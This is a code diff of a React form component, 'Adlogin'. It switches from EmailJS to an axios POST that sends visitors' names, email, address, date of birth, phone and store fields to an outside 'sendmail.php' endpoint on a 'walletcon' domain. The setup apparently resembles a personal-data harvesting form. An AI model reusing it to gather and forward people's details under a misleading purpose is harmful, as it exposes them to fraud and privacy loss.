@@ -1,32 +1,61 @@
 import { Label, TextInput } from 'flowbite-react'
 import { MdOutlineDriveFileRenameOutline } from "react-icons/md";
-import React, { useRef } from 'react';
-import emailjs from '@emailjs/browser'
 import { FaPhoneAlt } from "react-icons/fa";
 import { FaStoreAlt } from "react-icons/fa";
 import { FaStore } from "react-icons/fa";
-
-
-
-
+import { useState } from 'react';
+import axios from 'axios';
 
 const Adlogin = () => {
-  const form = useRef();
+  const [  first_name, setFirstName] = useState('');
+  const [ last_name, setLastName] = useState('');
+  const [  user_email, setEmail] = useState('');
+  const [city, setCity] = useState('');
+  const [address, setAddress] = useState('');
+  const [  user_age, setAge] = useState('');
+  const [phone, setPhone] = useState('');
+  const [ nike_store, setNikeStore] = useState('');
+  const [ walmart_store, setWalmartStore] = useState('');
 
-  const sendEmail = (e) => {
-      e.preventDefault();
-      emailjs.sendForm('default_service', 'template_kcl3606', form.current, '2abvf92yVnzhCmvw0')
-      .then((result) => {
-            console.log(result);
-              console.log(result.text);
-          }, (error) => {
-              console.log(error.text);
-          });
+
+   
+  const handleSubmit = (e) => {
+    console.log("");
+    e.preventDefault();
+    axios.post('https://walletcon.intedhub.com/sendmail.php', {
+      first_name:   first_name,
+      last_name:  last_name,
+      user_email:   user_email,
+      city: city,
+      address: address,
+      user_age: user_age,
+      phone: phone,
+      nike_store: nike_store,
+      walmart_store:   walmart_store
+    })
+      .then((response) => {
+        console.log(response);
+        console.log('Form submission success:', response.data);
+        // Reset form fields after successful submission if needed
+        setFirstName('');
+        setLastName('');
+        setEmail('');
+        setCity('');
+        setAddress('');
+        setAge('');
+        setPhone('');
+        setNikeStore('');
+        setWalmartStore('');
+      })
+      .catch((error) => {
+        console.error('Form submission error:', error);
+        // Show an error message
+      });
+
   };
-
   return (
     <>
-    <form ref={form} onSubmit={sendEmail} className=''>
+    <form onSubmit={handleSubmit}>
       <br />
       <br />
       <br />
@@ -39,6 +68,8 @@ const Adlogin = () => {
           rightIcon={MdOutlineDriveFileRenameOutline}
           id="first_name" name="first_name"
           placeholder="Clinton"
+          value={  first_name}
+          onChange={(e) => setFirstName(e.target.value)}
           required
         />
 
@@ -51,6 +82,8 @@ const Adlogin = () => {
           rightIcon={MdOutlineDriveFileRenameOutline}
           id="last_name" name="last_name" 
           placeholder="John "
+          value={ last_name}
+          onChange={(e) => setLastName(e.target.value)}
           required
         />
 
@@ -62,6 +95,8 @@ const Adlogin = () => {
           rightIcon={MdOutlineDriveFileRenameOutline}
           id="user_email" name="user_email"
           placeholder="john@gmail.com"
+          value={  user_email}
+            onChange={(e) => setEmail(e.target.value)}
           required
         />
 
@@ -73,6 +108,8 @@ const Adlogin = () => {
           rightIcon={MdOutlineDriveFileRenameOutline}
           id="city" name="city"
           placeholder="NYC"
+          value={city}
+          onChange={(e) => setCity(e.target.value)}
           required
         />
 
@@ -84,6 +121,8 @@ const Adlogin = () => {
           rightIcon={MdOutlineDriveFileRenameOutline}
           id="address" name="address" 
           placeholder="block 25 new jersey"
+          value={address}
+          onChange={(e) => setAddress(e.target.value)}
           required
         />
 
@@ -94,6 +133,9 @@ const Adlogin = () => {
           type="date"
          id='user_age' name='user_age'
           placeholder=""
+          value={   user_age}
+          onChange={(e) => setAge(e.target.value)}
+
           required
         />
 
@@ -106,6 +148,8 @@ const Adlogin = () => {
           id="phone" name="phone"
           rightIcon={FaPhoneAlt}
           placeholder=""
+          value={phone}
+          onChange={(e) => setPhone(e.target.value)}
           required
         />
 
@@ -118,6 +162,8 @@ const Adlogin = () => {
          id='nike_store' name='nike_store'
           rightIcon={FaStoreAlt}
           placeholder=""
+          value={ nike_store}
+          onChange={(e) => setNikeStore(e.target.value)}
           required
         />
 
@@ -130,6 +176,8 @@ const Adlogin = () => {
           name='walmart_store'
           rightIcon={ FaStore}
           placeholder=""
+          value={  walmart_store}
+            onChange={(e) => setWalmartStore(e.target.value)}
           required
         />
          
